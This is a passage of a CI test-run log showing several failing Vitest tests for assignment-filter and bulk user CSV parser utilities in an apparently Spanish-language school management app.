2025-11-18T17:36:11.2556265Z [31m[1m[7m FAIL [27m[22m[39m __tests__/utils/assignmentFilters.test.js[2m > [22mAssignment Filters Utilities[2m > [22mgetAvailableCommunitiesForSchool[2m > [22mshould return all communities for a school for admin
2025-11-18T17:36:11.2557154Z [31m[1mTypeError[22m: supabase.from.mockImplementation is not a function[39m
2025-11-18T17:36:11.2557814Z [36m [2m❯[22m __tests__/utils/assignmentFilters.test.js:[2m123:21[22m[39m
2025-11-18T17:36:11.2558055Z     [90m121| [39m      });
2025-11-18T17:36:11.2558250Z     [90m122| [39m
2025-11-18T17:36:11.2558747Z     [90m123| [39m      supabase.from.mockImplementation(mockFrom);
2025-11-18T17:36:11.2559088Z     [90m   | [39m                    [31m^[39m
2025-11-18T17:36:11.2559269Z     [90m124| [39m
2025-11-18T17:36:11.2559851Z     [90m125| [39m      const result = await getAvailableCommunitiesForSchool('admin-123…
2025-11-18T17:36:11.2559865Z 
2025-11-18T17:36:11.2560240Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[136/545]⎯[22m[39m
2025-11-18T17:36:11.2560252Z 
2025-11-18T17:36:11.2562199Z [31m[1m[7m FAIL [27m[22m[39m __tests__/utils/assignmentFilters.test.js[2m > [22mAssignment Filters Utilities[2m > [22mgetAvailableCommunitiesForSchool[2m > [22mshould filter communities for consultants
2025-11-18T17:36:11.2562936Z [31m[1mTypeError[22m: supabase.from.mockImplementation is not a function[39m
2025-11-18T17:36:11.2563603Z [36m [2m❯[22m __tests__/utils/assignmentFilters.test.js:[2m173:21[22m[39m
2025-11-18T17:36:11.2563844Z     [90m171| [39m      });
2025-11-18T17:36:11.2564014Z     [90m172| [39m
2025-11-18T17:36:11.2564448Z     [90m173| [39m      supabase.from.mockImplementation(mockFrom);
2025-11-18T17:36:11.2564746Z     [90m   | [39m                    [31m^[39m
2025-11-18T17:36:11.2564912Z     [90m174| [39m
2025-11-18T17:36:11.2565493Z     [90m175| [39m      const result = await getAvailableCommunitiesForSchool('consultan…
2025-11-18T17:36:11.2565508Z 
2025-11-18T17:36:11.2565895Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[137/545]⎯[22m[39m
2025-11-18T17:36:11.2565921Z 
2025-11-18T17:36:11.2568081Z [31m[1m[7m FAIL [27m[22m[39m __tests__/utils/assignmentFilters.test.js[2m > [22mAssignment Filters Utilities[2m > [22mgetAvailableCommunitiesForSchool[2m > [22mshould return all communities when no school is specified
2025-11-18T17:36:11.2568879Z [31m[1mTypeError[22m: supabase.from.mockImplementation is not a function[39m
2025-11-18T17:36:11.2569511Z [36m [2m❯[22m __tests__/utils/assignmentFilters.test.js:[2m197:21[22m[39m
2025-11-18T17:36:11.2569701Z     [90m195| [39m      });
2025-11-18T17:36:11.2569878Z     [90m196| [39m
2025-11-18T17:36:11.2570301Z     [90m197| [39m      supabase.from.mockImplementation(mockFrom);
2025-11-18T17:36:11.2570600Z     [90m   | [39m                    [31m^[39m
2025-11-18T17:36:11.2570770Z     [90m198| [39m
2025-11-18T17:36:11.2571373Z     [90m199| [39m      const result = await getAvailableCommunitiesForSchool('admin-123…
2025-11-18T17:36:11.2571391Z 
2025-11-18T17:36:11.2571809Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[138/545]⎯[22m[39m
2025-11-18T17:36:11.2571823Z 
2025-11-18T17:36:11.2573698Z [31m[1m[7m FAIL [27m[22m[39m __tests__/utils/assignmentFilters.test.js[2m > [22mAssignment Filters Utilities[2m > [22mgetAvailableGenerationsForSchool[2m > [22mshould return empty array if school has no generations
2025-11-18T17:36:11.2574405Z [31m[1mTypeError[22m: supabase.from.mockImplementation is not a function[39m
2025-11-18T17:36:11.2574999Z [36m [2m❯[22m __tests__/utils/assignmentFilters.test.js:[2m223:21[22m[39m
2025-11-18T17:36:11.2575188Z     [90m221| [39m      });
2025-11-18T17:36:11.2575354Z     [90m222| [39m
2025-11-18T17:36:11.2576046Z     [90m223| [39m      supabase.from.mockImplementation(mockFrom);
2025-11-18T17:36:11.2576371Z     [90m   | [39m                    [31m^[39m
2025-11-18T17:36:11.2576571Z     [90m224| [39m
2025-11-18T17:36:11.2577469Z     [90m225| [39m      const result = await getAvailableGenerationsForSchool('admin-123…
2025-11-18T17:36:11.2577487Z 
2025-11-18T17:36:11.2578145Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[139/545]⎯[22m[39m
2025-11-18T17:36:11.2578170Z 
2025-11-18T17:36:11.2580044Z [31m[1m[7m FAIL [27m[22m[39m __tests__/utils/assignmentFilters.test.js[2m > [22mAssignment Filters Utilities[2m > [22mgetAvailableGenerationsForSchool[2m > [22mshould return generations for schools that have them
2025-11-18T17:36:11.2580723Z [31m[1mTypeError[22m: supabase.from.mockImplementation is not a function[39m
2025-11-18T17:36:11.2581313Z [36m [2m❯[22m __tests__/utils/assignmentFilters.test.js:[2m263:21[22m[39m
2025-11-18T17:36:11.2581535Z     [90m261| [39m      });
2025-11-18T17:36:11.2581752Z     [90m262| [39m
2025-11-18T17:36:11.2582217Z     [90m263| [39m      supabase.from.mockImplementation(mockFrom);
2025-11-18T17:36:11.2582531Z     [90m   | [39m                    [31m^[39m
2025-11-18T17:36:11.2582712Z     [90m264| [39m
2025-11-18T17:36:11.2583316Z     [90m265| [39m      const result = await getAvailableGenerationsForSchool('admin-123…
2025-11-18T17:36:11.2583334Z 
2025-11-18T17:36:11.2583781Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[140/545]⎯[22m[39m
2025-11-18T17:36:11.2583799Z 
2025-11-18T17:36:11.2585572Z [31m[1m[7m FAIL [27m[22m[39m __tests__/utils/assignmentFilters.test.js[2m > [22mAssignment Filters Utilities[2m > [22mgetAvailableGenerationsForSchool[2m > [22mshould filter generations for consultants
2025-11-18T17:36:11.2586239Z [31m[1mTypeError[22m: supabase.from.mockImplementation is not a function[39m
2025-11-18T17:36:11.2587079Z [36m [2m❯[22m __tests__/utils/assignmentFilters.test.js:[2m324:21[22m[39m
2025-11-18T17:36:11.2587333Z     [90m322| [39m      });
2025-11-18T17:36:11.2587536Z     [90m323| [39m
2025-11-18T17:36:11.2587995Z     [90m324| [39m      supabase.from.mockImplementation(mockFrom);
2025-11-18T17:36:11.2588316Z     [90m   | [39m                    [31m^[39m
2025-11-18T17:36:11.2588517Z     [90m325| [39m
2025-11-18T17:36:11.2589163Z     [90m326| [39m      const result = await getAvailableGenerationsForSchool('consultan…
2025-11-18T17:36:11.2589184Z 
2025-11-18T17:36:11.2589611Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[141/545]⎯[22m[39m
2025-11-18T17:36:11.2589624Z 
2025-11-18T17:36:11.2591002Z [31m[1m[7m FAIL [27m[22m[39m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mdetectDelimiter[2m > [22mshould detect comma delimiter
2025-11-18T17:36:11.2591530Z [31m[1mTypeError[22m: detectDelimiter is not a function[39m
2025-11-18T17:36:11.2592140Z [36m [2m❯[22m __tests__/utils/bulkUserParser.test.ts:[2m19:14[22m[39m
2025-11-18T17:36:11.2592461Z     [90m 17| [39mjohn@test.com,John Doe,admin
2025-11-18T17:36:11.2593105Z     [90m 18| [39mjane@test.com,Jane Smith,docente`;
2025-11-18T17:36:11.2593534Z     [90m 19| [39m      expect(detectDelimiter(csv)).toBe(',');
2025-11-18T17:36:11.2593863Z     [90m   | [39m             [31m^[39m
2025-11-18T17:36:11.2594061Z     [90m 20| [39m    });
2025-11-18T17:36:11.2594229Z     [90m 21| [39m
2025-11-18T17:36:11.2594241Z 
2025-11-18T17:36:11.2594641Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[142/545]⎯[22m[39m
2025-11-18T17:36:11.2594654Z 
2025-11-18T17:36:11.2595999Z [31m[1m[7m FAIL [27m[22m[39m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mdetectDelimiter[2m > [22mshould detect tab delimiter
2025-11-18T17:36:11.2596540Z [31m[1mTypeError[22m: detectDelimiter is not a function[39m
2025-11-18T17:36:11.2597336Z [36m [2m❯[22m __tests__/utils/bulkUserParser.test.ts:[2m26:14[22m[39m
2025-11-18T17:36:11.2597678Z     [90m 24| [39mjohn@test.com\tJohn Doe\tadmin
2025-11-18T17:36:11.2598043Z     [90m 25| [39mjane@test.com\tJane Smith\tdocente`;
2025-11-18T17:36:11.2598494Z     [90m 26| [39m      expect(detectDelimiter(tsv)).toBe('\t');
2025-11-18T17:36:11.2598798Z     [90m   | [39m             [31m^[39m
2025-11-18T17:36:11.2598995Z     [90m 27| [39m    });
2025-11-18T17:36:11.2599162Z     [90m 28| [39m
2025-11-18T17:36:11.2599174Z 
2025-11-18T17:36:11.2599545Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[143/545]⎯[22m[39m
2025-11-18T17:36:11.2599767Z 
2025-11-18T17:36:11.2601178Z [31m[1m[7m FAIL [27m[22m[39m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mdetectDelimiter[2m > [22mshould detect semicolon delimiter
2025-11-18T17:36:11.2601721Z [31m[1mTypeError[22m: detectDelimiter is not a function[39m
2025-11-18T17:36:11.2602309Z [36m [2m❯[22m __tests__/utils/bulkUserParser.test.ts:[2m33:14[22m[39m
2025-11-18T17:36:11.2602647Z     [90m 31| [39mjohn@test.com;John Doe;admin
2025-11-18T17:36:11.2603018Z     [90m 32| [39mjane@test.com;Jane Smith;docente`;
2025-11-18T17:36:11.2603470Z     [90m 33| [39m      expect(detectDelimiter(csv)).toBe(';');
2025-11-18T17:36:11.2603742Z     [90m   | [39m             [31m^[39m
2025-11-18T17:36:11.2603925Z     [90m 34| [39m    });
2025-11-18T17:36:11.2604101Z     [90m 35| [39m
2025-11-18T17:36:11.2604115Z 
2025-11-18T17:36:11.2604480Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[144/545]⎯[22m[39m
2025-11-18T17:36:11.2604492Z 
2025-11-18T17:36:11.2605889Z [31m[1m[7m FAIL [27m[22m[39m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mdetectDelimiter[2m > [22mshould detect pipe delimiter
2025-11-18T17:36:11.2606426Z [31m[1mTypeError[22m: detectDelimiter is not a function[39m
2025-11-18T17:36:11.2607195Z [36m [2m❯[22m __tests__/utils/bulkUserParser.test.ts:[2m39:14[22m[39m
2025-11-18T17:36:11.2627155Z     [90m 37| [39m      const csv = `email|name|role
2025-11-18T17:36:11.2627598Z     [90m 38| [39mjohn@test.com|John Doe|admin`;
2025-11-18T17:36:11.2628042Z     [90m 39| [39m      expect(detectDelimiter(csv)).toBe('|');
2025-11-18T17:36:11.2628371Z     [90m   | [39m             [31m^[39m
2025-11-18T17:36:11.2628598Z     [90m 40| [39m    });
2025-11-18T17:36:11.2628794Z     [90m 41| [39m
2025-11-18T17:36:11.2628811Z 
2025-11-18T17:36:11.2629212Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[145/545]⎯[22m[39m
2025-11-18T17:36:11.2629225Z 
2025-11-18T17:36:11.2630727Z [31m[1m[7m FAIL [27m[22m[39m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mdetectDelimiter[2m > [22mshould default to comma when no clear delimiter
2025-11-18T17:36:11.2631261Z [31m[1mTypeError[22m: detectDelimiter is not a function[39m
2025-11-18T17:36:11.2631856Z [36m [2m❯[22m __tests__/utils/bulkUserParser.test.ts:[2m45:14[22m[39m
2025-11-18T17:36:11.2632193Z     [90m 43| [39m      const text = `john@test.com
2025-11-18T17:36:11.2632459Z     [90m 44| [39mjane@test.com`;
2025-11-18T17:36:11.2632879Z     [90m 45| [39m      expect(detectDelimiter(text)).toBe(',');
2025-11-18T17:36:11.2633484Z     [90m   | [39m             [31m^[39m
2025-11-18T17:36:11.2633692Z     [90m 46| [39m    });
2025-11-18T17:36:11.2633872Z     [90m 47| [39m  });
2025-11-18T17:36:11.2633886Z 
2025-11-18T17:36:11.2634257Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[146/545]⎯[22m[39m
2025-11-18T17:36:11.2634269Z 
2025-11-18T17:36:11.2635694Z [31m[1m[7m FAIL [27m[22m[39m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mparseBulkUserData[2m > [22mshould parse CSV without headers
2025-11-18T17:36:11.2636123Z [31m[1mError[22m: La columna "email" es requerida.[39m
2025-11-18T17:36:11.2657107Z [36m [2m❯[22m Module.parseBulkUserData utils/bulkUserParser.ts:[2m249:11[22m[39m
2025-11-18T17:36:11.2657388Z     [90m247| [39m
2025-11-18T17:36:11.2657716Z     [90m248| [39m  if (columns.email === -1) {
2025-11-18T17:36:11.2658197Z     [90m249| [39m    throw new Error('La columna "email" es requerida.');
2025-11-18T17:36:11.2658457Z     [90m   | [39m          [31m^[39m
2025-11-18T17:36:11.2658688Z     [90m250| [39m  }
2025-11-18T17:36:11.2658886Z     [90m251| [39m
2025-11-18T17:36:11.2659497Z [90m [2m❯[22m __tests__/utils/bulkUserParser.test.ts:[2m74:22[22m[39m
2025-11-18T17:36:11.2659517Z 
2025-11-18T17:36:11.2659931Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[147/545]⎯[22m[39m
2025-11-18T17:36:11.2659948Z 
2025-11-18T17:36:11.2661508Z [31m[1m[7m FAIL [27m[22m[39m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mparseBulkUserData[2m > [22mshould validate roles
2025-11-18T17:36:11.2662562Z [31m[1mAssertionError[22m: expected [ 'Rol \'invalid_role\' inválido' ] to include 'Rol inválido: invalid_role'[39m
2025-11-18T17:36:11.2663172Z [36m [2m❯[22m __tests__/utils/bulkUserParser.test.ts:[2m111:40[22m[39m
2025-11-18T17:36:11.2663583Z     [90m109| [39m      expect(result.invalid).toHaveLength(1);
2025-11-18T17:36:11.2663992Z     [90m110| [39m      expect(result.valid).toHaveLength(1);
2025-11-18T17:36:11.2664615Z     [90m111| [39m      expect(result.invalid[0].errors).toContain('Rol inválido: invali…
2025-11-18T17:36:11.2665015Z     [90m   | [39m                                       [31m^[39m
2025-11-18T17:36:11.2665219Z     [90m112| [39m    });
2025-11-18T17:36:11.2665401Z     [90m113| [39m
2025-11-18T17:36:11.2665416Z 
2025-11-18T17:36:11.2665816Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[148/545]⎯[22m[39m
2025-11-18T17:36:11.2665851Z 
2025-11-18T17:36:11.2667663Z [31m[1m[7m FAIL [27m[22m[39m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mparseBulkUserData[2m > [22mshould add warnings for Chilean emails without RUT
2025-11-18T17:36:11.2668584Z [31m[1mAssertionError[22m: expected [ Array(1) ] to include 'Email chileno detectado - considere a…'[39m
2025-11-18T17:36:11.2669208Z [36m [2m❯[22m __tests__/utils/bulkUserParser.test.ts:[2m182:40[22m[39m
2025-11-18T17:36:11.2669631Z     [90m180| [39m      const result = parseBulkUserData(csv);
2025-11-18T17:36:11.2669850Z     [90m181| [39m      
2025-11-18T17:36:11.2670450Z     [90m182| [39m      expect(result.valid[0].warnings).toContain('Email chileno detect…
2025-11-18T17:36:11.2670872Z     [90m   | [39m                                       [31m^[39m
2025-11-18T17:36:11.2671075Z     [90m183| [39m    });
2025-11-18T17:36:11.2671245Z     [90m184| [39m
2025-11-18T17:36:11.2671259Z 
2025-11-18T17:36:11.2671651Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[149/545]⎯[22m[39m
2025-11-18T17:36:11.2671673Z 
2025-11-18T17:36:11.2673143Z [31m[1m[7m FAIL [27m[22m[39m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mparseBulkUserData[2m > [22mshould add warnings for missing names
2025-11-18T17:36:11.2674045Z [31m[1mAssertionError[22m: expected [ Array(1) ] to include 'Se recomienda incluir nombre y apelli…'[39m
2025-11-18T17:36:11.2674627Z [36m [2m❯[22m __tests__/utils/bulkUserParser.test.ts:[2m191:40[22m[39m
2025-11-18T17:36:11.2675035Z     [90m189| [39m      const result = parseBulkUserData(csv);
2025-11-18T17:36:11.2675512Z     [90m190| [39m      
2025-11-18T17:36:11.2676040Z     [90m191| [39m      expect(result.valid[0].warnings).toContain('Se recomienda inclui…
2025-11-18T17:36:11.2676399Z     [90m   | [39m                                       [31m^[39m
2025-11-18T17:36:11.2676608Z     [90m192| [39m    });
2025-11-18T17:36:11.2697090Z     [90m193| [39m
2025-11-18T17:36:11.2697141Z 
2025-11-18T17:36:11.2697624Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[150/545]⎯[22m[39m
2025-11-18T17:36:11.2697640Z 
2025-11-18T17:36:11.2698982Z [31m[1m[7m FAIL [27m[22m[39m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mformatParsedData[2m > [22mshould format users as table
2025-11-18T17:36:11.2699728Z [31m[1mAssertionError[22m: expected [ { email: 'john@test.com', …(5) } ] to include 'Email'[39m
2025-11-18T17:36:11.2700284Z [36m [2m❯[22m __tests__/utils/bulkUserParser.test.ts:[2m267:25[22m[39m
2025-11-18T17:36:11.2700708Z     [90m265| [39m      const formatted = formatParsedData(users);
2025-11-18T17:36:11.2700891Z     [90m266| [39m      
2025-11-18T17:36:11.2701256Z     [90m267| [39m      expect(formatted).toContain('Email');
2025-11-18T17:36:11.2701535Z     [90m   | [39m                        [31m^[39m
2025-11-18T17:36:11.2701946Z     [90m268| [39m      expect(formatted).toContain('john@test.com');
2025-11-18T17:36:11.2702547Z     [90m269| [39m      expect(formatted).toContain('12.345.678-5');
2025-11-18T17:36:11.2702563Z 
2025-11-18T17:36:11.2702944Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[151/545]⎯[22m[39m
2025-11-18T17:36:11.2702956Z 
2025-11-18T17:36:11.2704293Z [31m[1m[7m FAIL [27m[22m[39m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mformatParsedData[2m > [22mshould handle missing values
2025-11-18T17:36:11.2705115Z [31m[1mAssertionError[22m: expected [ { email: 'john@test.com', …(1) } ] to include 'john@test.com'[39m
2025-11-18T17:36:11.2705671Z [36m [2m❯[22m __tests__/utils/bulkUserParser.test.ts:[2m283:25[22m[39m
2025-11-18T17:36:11.2706073Z     [90m281| [39m      const formatted = formatParsedData(users);
2025-11-18T17:36:11.2706256Z     [90m282| [39m      
2025-11-18T17:36:11.2706669Z     [90m283| [39m      expect(formatted).toContain('john@test.com');
2025-11-18T17:36:11.2707140Z     [90m   | [39m                        [31m^[39m
2025-11-18T17:36:11.2707578Z     [90m284| [39m      expect(formatted).not.toContain('undefined');
2025-11-18T17:36:11.2707761Z     [90m285| [39m    });
2025-11-18T17:36:11.2707773Z 
2025-11-18T17:36:11.2708139Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[152/545]⎯[22m[39m
2025-11-18T17:36:11.2708157Z 
2025-11-18T17:36:11.2709399Z [31m[1m[7m FAIL [27m[22m[39m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mexportAsCSV[2m > [22mshould export users as CSV
2025-11-18T17:36:11.2710527Z [31m[1mAssertionError[22m: expected 'email,firstName,lastName,role,rut\n"j…' to include 'email,firstName,lastName,role,rut,pas…'[39m
2025-11-18T17:36:11.2711099Z [36m [2m❯[22m __tests__/utils/bulkUserParser.test.ts:[2m309:19[22m[39m
2025-11-18T17:36:11.2711442Z     [90m307| [39m      const csv = exportAsCSV(users);
2025-11-18T17:36:11.2711627Z     [90m308| [39m      
2025-11-18T17:36:11.2712275Z     [90m309| [39m      expect(csv).toContain('email,firstName,lastName,role,rut,passwor…
2025-11-18T17:36:11.2712575Z     [90m   | [39m                  [31m^[39m
2025-11-18T17:36:11.2713124Z     [90m310| [39m      expect(csv).toContain('john@test.com,John,Doe,admin,,Test1234');
2025-11-18T17:36:11.2713690Z     [90m311| [39m      expect(csv).toContain('jane@test.com,Jane,Smith,docente,11.111.1…
2025-11-18T17:36:11.2713702Z 
2025-11-18T17:36:11.2714064Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[153/545]⎯[22m[39m
2025-11-18T17:36:11.2714076Z 
2025-11-18T17:36:11.2715480Z [31m[1m[7m FAIL [27m[22m[39m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mexportAsCSV[2m > [22mshould quote values with special characters
2025-11-18T17:36:11.2716516Z [31m[1mAssertionError[22m: expected 'email,firstName,lastName,role,rut\n"j…' to include '"O""Brien"'[39m
2025-11-18T17:36:11.2717228Z [36m [2m❯[22m __tests__/utils/bulkUserParser.test.ts:[2m327:19[22m[39m
2025-11-18T17:36:11.2717429Z     [90m325| [39m      
2025-11-18T17:36:11.2717826Z     [90m326| [39m      expect(csv).toContain('"John, Jr."');
2025-11-18T17:36:11.2718295Z     [90m327| [39m      expect(csv).toContain('"O""Brien"'); // Escaped quotes
2025-11-18T17:36:11.2718572Z     [90m   | [39m                  [31m^[39m
2025-11-18T17:36:11.2718762Z     [90m328| [39m    });
2025-11-18T17:36:11.2718932Z     [90m329| [39m  });
2025-11-18T17:36:11.2718945Z 
2025-11-18T17:36:11.2719320Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[154/545]⎯[22m[39m
2025-11-18T17:36:11.2719332Z 
2025-11-18T17:36:11.2720677Z [31m[1m[7m FAIL [27m[22m[39m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mdetectRoleFromEmail[2m > [22mshould detect admin role
2025-11-18T17:36:11.2721204Z [31m[1mTypeError[22m: detectRoleFromEmail is not a function[39m
2025-11-18T17:36:11.2721772Z [36m [2m❯[22m __tests__/utils/bulkUserParser.test.ts:[2m333:14[22m[39m
2025-11-18T17:36:11.2722171Z     [90m331| [39m  describe('detectRoleFromEmail', () => {
2025-11-18T17:36:11.2722765Z     [90m332| [39m    it('should detect admin role', () => {
2025-11-18T17:36:11.2723350Z     [90m333| [39m      expect(detectRoleFromEmail('user@admin.com')).toBe('admin');
2025-11-18T17:36:11.2723616Z     [90m   | [39m             [31m^[39m
2025-11-18T17:36:11.2724182Z     [90m334| [39m      expect(detectRoleFromEmail('admin@company.com')).toBe('admin');
2025-11-18T17:36:11.2724386Z     [90m335| [39m    });
2025-11-18T17:36:11.2724399Z 
2025-11-18T17:36:11.2724780Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[155/545]⎯[22m[39m
2025-11-18T17:36:11.2724807Z 
2025-11-18T17:36:11.2726184Z [31m[1m[7m FAIL [27m[22m[39m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mdetectRoleFromEmail[2m > [22mshould detect consultant role
2025-11-18T17:36:11.2726719Z [31m[1mTypeError[22m: detectRoleFromEmail is not a function[39m
2025-11-18T17:36:11.2727457Z [36m [2m❯[22m __tests__/utils/bulkUserParser.test.ts:[2m338:14[22m[39m
2025-11-18T17:36:11.2727637Z     [90m336| [39m
2025-11-18T17:36:11.2728053Z     [90m337| [39m    it('should detect consultant role', () => {
2025-11-18T17:36:11.2728629Z     [90m338| [39m      expect(detectRoleFromEmail('user@consultant.com')).toBe('consult…
2025-11-18T17:36:11.2728890Z     [90m   | [39m             [31m^[39m
2025-11-18T17:36:11.2729461Z     [90m339| [39m      expect(detectRoleFromEmail('user@consultor.cl')).toBe('consultor…
2025-11-18T17:36:11.2729654Z     [90m340| [39m    });
2025-11-18T17:36:11.2729666Z 
2025-11-18T17:36:11.2730035Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[156/545]⎯[22m[39m
2025-11-18T17:36:11.2730060Z 
2025-11-18T17:36:11.2731482Z [31m[1m[7m FAIL [27m[22m[39m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mdetectRoleFromEmail[2m > [22mshould detect director role
2025-11-18T17:36:11.2732054Z [31m[1mTypeError[22m: detectRoleFromEmail is not a function[39m
2025-11-18T17:36:11.2732626Z [36m [2m❯[22m __tests__/utils/bulkUserParser.test.ts:[2m343:14[22m[39m
2025-11-18T17:36:11.2732811Z     [90m341| [39m
2025-11-18T17:36:11.2733179Z     [90m342| [39m    it('should detect director role', () => {
2025-11-18T17:36:11.2733737Z     [90m343| [39m      expect(detectRoleFromEmail('user@director.edu')).toBe('equipo_di…
2025-11-18T17:36:11.2733992Z     [90m   | [39m             [31m^[39m
2025-11-18T17:36:11.2734180Z     [90m344| [39m    });
2025-11-18T17:36:11.2734344Z     [90m345| [39m
2025-11-18T17:36:11.2734355Z 
2025-11-18T17:36:11.2734726Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[157/545]⎯[22m[39m
2025-11-18T17:36:11.2734738Z 
2025-11-18T17:36:11.2736477Z [31m[1m[7m FAIL [27m[22m[39m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mdetectRoleFromEmail[2m > [22mshould return null for unrecognized patterns
2025-11-18T17:36:11.2737162Z [31m[1mTypeError[22m: detectRoleFromEmail is not a function[39m
2025-11-18T17:36:11.2737711Z [36m [2m❯[22m __tests__/utils/bulkUserParser.test.ts:[2m347:14[22m[39m
2025-11-18T17:36:11.2737901Z     [90m345| [39m
2025-11-18T17:36:11.2738374Z     [90m346| [39m    it('should return null for unrecognized patterns', () => {
2025-11-18T17:36:11.2738877Z     [90m347| [39m      expect(detectRoleFromEmail('user@company.com')).toBe(null);
2025-11-18T17:36:11.2739145Z     [90m   | [39m             [31m^[39m
2025-11-18T17:36:11.2739643Z     [90m348| [39m      expect(detectRoleFromEmail('invalid-email')).toBe(null);
2025-11-18T17:36:11.2739844Z     [90m349| [39m    });
2025-11-18T17:36:11.2739858Z 
2025-11-18T17:36:11.2740242Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[158/545]⎯[22m[39m
2025-11-18T17:36:11.2740266Z 
2025-11-18T17:36:11.2741664Z [31m[1m[7m FAIL [27m[22m[39m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mgenerateSampleCSV[2m > [22mshould generate sample CSV data
2025-11-18T17:36:11.2742645Z [31m[1mAssertionError[22m: expected 'email,firstName,lastName,role,rut\n"j…' to include 'usuario1@ejemplo.cl'[39m
2025-11-18T17:36:11.2743417Z [36m [2m❯[22m __tests__/utils/bulkUserParser.test.ts:[2m357:22[22m[39m
2025-11-18T17:36:11.2743613Z     [90m355| [39m      
2025-11-18T17:36:11.2744180Z     [90m356| [39m      expect(sample).toContain('email,firstName,lastName,role,rut');
2025-11-18T17:36:11.2744619Z     [90m357| [39m      expect(sample).toContain('usuario1@ejemplo.cl');
2025-11-18T17:36:11.2744909Z     [90m   | [39m                     [31m^[39m
2025-11-18T17:36:11.2745336Z     [90m358| [39m      expect(sample).toContain('usuario2@ejemplo.cl');
2025-11-18T17:36:11.2745764Z     [90m359| [39m      expect(sample).toContain('usuario3@ejemplo.cl');
2025-11-18T17:36:11.2745789Z 
2025-11-18T17:36:11.2746154Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[159/545]⎯[22m[39m
2025-11-18T17:36:11.2746166Z 
2025-11-18T17:36:11.2747694Z [31m[1m[7m FAIL [27m[22m[39m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mgenerateSampleCSV[2m > [22mshould generate admin for first user
2025-11-18T17:36:11.2748529Z [31m[1mAssertionError[22m: expected '"juan.perez@ejemplo.com","Juan","Pére…' to include 'admin'[39m
2025-11-18T17:36:11.2749077Z [36m [2m❯[22m __tests__/utils/bulkUserParser.test.ts:[2m366:24[22m[39m
2025-11-18T17:36:11.2749426Z     [90m364| [39m      const lines = sample.split('\n');
